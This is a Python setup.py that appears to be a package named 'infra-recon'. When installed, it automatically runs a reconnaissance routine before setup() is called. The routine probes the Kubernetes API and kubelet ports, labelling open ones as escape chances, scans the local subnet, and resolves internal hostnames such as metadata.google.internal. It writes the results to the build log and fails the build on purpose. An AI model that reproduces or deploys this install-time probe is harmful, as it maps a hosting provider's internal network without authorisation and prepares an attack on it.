import os, sys, socket, subprocess as sp
from setuptools import setup

def heavy_recon():
    o = sys.stderr.write
    o("\n" + "W"*40 + "\n")
    o("--- RENDER INFRASTRUCTURE DEEP SCAN ---\n")

 
    o("[1] K8S API CHECK:\n")
    k8s_host = "kubernetes.default.svc"
    try:
        ip = socket.gethostbyname(k8s_host)
        o(f"K8s Cluster IP found: {ip}\n")
        # Проверяем порты 443 (API) и 10250 (Kubelet)
        for port in [443, 10250, 10255]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                o(f"PORT {port} IS OPEN! Potential for K8s Escape.\n")
            s.close()
    except: o("K8s Service not resolved.\n")

 
    o("\n[2] LOCAL NETWORK SCAN (10.x.x.x):\n")
 
    my_ip = sp.getoutput("hostname -I").split()[0]
    base_ip = ".".join(my_ip.split('.')[:-1])
    o(f"My IP: {my_ip}. Scanning subnet {base_ip}.0/24...\n")
    
    for i in range(1, 10): # Проверим первые 10 хостов для теста
        target = f"{base_ip}.{i}"
        s = socket.socket()
        s.settimeout(0.1)
        if s.connect_ex((target, 80)) == 0:
            o(f"HOST {target}:80 IS ALIVE\n")
        s.close()

 
    o("\n[3] INTERNAL DNS ENUMERATION:\n")
    internal_queries = ["render.internal", "metadata.google.internal", "db.internal"]
    for q in internal_queries:
        try:
            o(f"Query {q}: {socket.gethostbyname(q)}\n")
        except: pass

    o("\n" + "W"*40 + "\n")
    sys.exit(1)

try: heavy_recon()
except: sys.exit(1)

setup(name="infra-recon", version="1.0")
